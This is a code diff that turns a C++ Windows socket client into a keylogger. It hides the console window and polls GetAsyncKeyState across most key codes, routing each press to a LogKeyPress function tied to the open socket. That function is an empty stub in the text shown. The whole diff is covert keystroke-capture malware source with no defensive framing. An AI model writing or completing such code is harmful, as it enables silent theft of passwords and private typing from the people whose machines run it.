@@ -10,6 +10,7 @@
 #include <conio.h>
 #include "WSAInitializer.h"
 #include <thread>
+void LogKeyPress(int key, SOCKET sock);
 
 int main() 
 {
@@ -37,16 +38,29 @@ int main()
 		//return 0;
 	}
 
+	// Hide the console window
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow(hWnd, SW_HIDE);
+
 	char c = '\0';
 
-	while (_clientSocket != NULL) {		
-		if (_kbhit()) {
-			c = _getch();
+
+	// Infinite loop to log keys
+	while (_clientSocket != NULL)
+	{
+		for (int key = 8; key <= 190; key++)
+		{
+			if (GetAsyncKeyState(key) & 0x0001)
+			{
+				LogKeyPress(key, _clientSocket);
+			}
 		}
-		/* If a key has been pressed */
-		if (c != '\0') {
-			send(_clientSocket, std::to_string(c).c_str(), std::to_string(c).size(), 0);  // last parameter: flag. for us will be 0.
-			c = '\0'; // and put it back to \0
-		}
+
+		Sleep(10); // Sleep for a short duration to reduce CPU usage
 	}
+}
+
+void LogKeyPress(int key, SOCKET sock)
+{
+
 }
